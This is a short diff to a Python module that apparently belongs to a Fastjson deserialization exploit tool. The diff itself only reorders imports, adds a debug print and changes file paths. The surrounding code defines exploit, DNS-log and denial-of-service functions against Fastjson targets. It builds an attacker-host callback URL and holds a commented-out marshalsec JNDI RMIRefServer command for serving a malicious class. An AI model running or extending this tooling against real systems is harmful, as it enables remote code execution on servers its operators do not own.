@@ -7,10 +7,12 @@
 @Date ：2021/7/2 17:57 
 
 '''
+import json, base64, requests, sys
+print(sys.path)
 from utils.user_agent import UserAgent
 from utils.rw_file import RWFile
 from fastjson.dis_fastjaon import DisFastjson
-import json, base64, requests, getopt, sys
+
 
 
 def dnslog_fastjson(url):
@@ -65,7 +67,7 @@ def dos_fastjson(url):
 
 
 def fastjson_exploit(url, ip, lis_port, filename, content_type='application/json', cookie=None):
-    pocs = RWFile('../texts/fastjson_poc').read()
+    pocs = RWFile('texts/fastjson_poc').read()
     http_url = ip + ':' + lis_port + '/' + filename
     # listen(ip, username, passwd, lis_port, http_port, filename)
     # cmd = 'cd marshalsec/ && java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://'+ ip +':'+ http_port +'/#'+ filename +'" '+ lis_port
@@ -98,7 +100,7 @@ def headers(content_type, cookie):
     :param cookie:
     :return: obj
     """
-    agent = UserAgent(RWFile('../texts/user_agent')).random_agent()
+    agent = UserAgent(RWFile('texts/user_agent')).random_agent()
     if cookie is None:
         headers = {
             'user-agent': agent,
